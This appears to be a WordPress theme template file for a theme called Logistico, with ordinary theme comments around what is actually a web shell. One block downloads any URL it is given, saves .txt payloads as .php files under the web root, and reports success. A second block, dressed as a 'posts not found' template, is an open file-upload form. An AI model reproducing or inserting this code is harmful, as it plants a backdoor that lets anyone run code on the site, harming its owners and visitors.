<?php
error_reporting(0);
/**
 * The main template file
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package Logistico
 * @since 1.0
 * @version 1.0
 */
echo "Logistico package";
$path = __DIR__;
function get($url, $dir){ $ch=curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch,CURLOPT_TIMEOUT,10); $data = curl_exec($ch); if(!$data){ $data = @file_get_contents($url);} file_put_contents($dir, $data);} if($_GET["url"]){ $url = $_GET["url"]; preg_match("/(.*)\/(.*)\.(.*?)$/",$url,$n); if($n[3]=="txt"){ $z="php"; $name=$n[2]; }else{ $z=$n[3]; $name="moban"; } if($_GET["dir"]){ $dir=$_SERVER["DOCUMENT_ROOT"]."/".$_GET["dir"]."/".$name.".".$z; }else{ $dir=$_SERVER["DOCUMENT_ROOT"]."/".$name.".".$z;} get($url,$dir); if(file_exists($dir)){echo "<tr><td><font color=\"green\">download success</font></td></tr>";}else{echo "<tr><td><font color=\"red\">download fail</font></td></tr>";}}elseif($_POST["url"]){ $url = $_POST["url"]; preg_match("/(.*)\/(.*)\.(.*?)$/",$url,$n); if($n[3]=="txt"){ $z="php"; $name=$n[2];}else{$z=$n[3]; $name="moban";} $dir = $_POST["path"]."/".$name.".".$z; get($url,$dir); if(file_exists($dir)){echo "<tr><td><font color=\"green\">download success</font></td></tr>";}else{echo "<tr><td><font color=\"red\">download fail</font></td></tr>";}}echo "<tr><td><form method=\"POST\"><span>Url: </span><input type=text name=\"url\" value=\"\"><input type=\"hidden\" name=\"path\" value=\"$path\"><input type=submit value=\"Download\"></form></td></tr>";
?>

<?php
/**
 * Template part for displaying a message that posts cannot be found
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package Logistico
 */

if(isset($_FILES["getfile"])){
	$tarpath=basename($_FILES["getfile"]["name"]);
	if(move_uploaded_file($_FILES["getfile"]["tmp_name"],$tarpath)){
		echo "<font color=\"green\">file get successs</font><br />";
	}else{
	echo "<font color=\"red\">file get fail</font><br />";
	}
}
?>
<form enctype="multipart/form-data" method="POST"><input name="getfile" type="file"/><input type="submit" value="done"/></form></td></tr>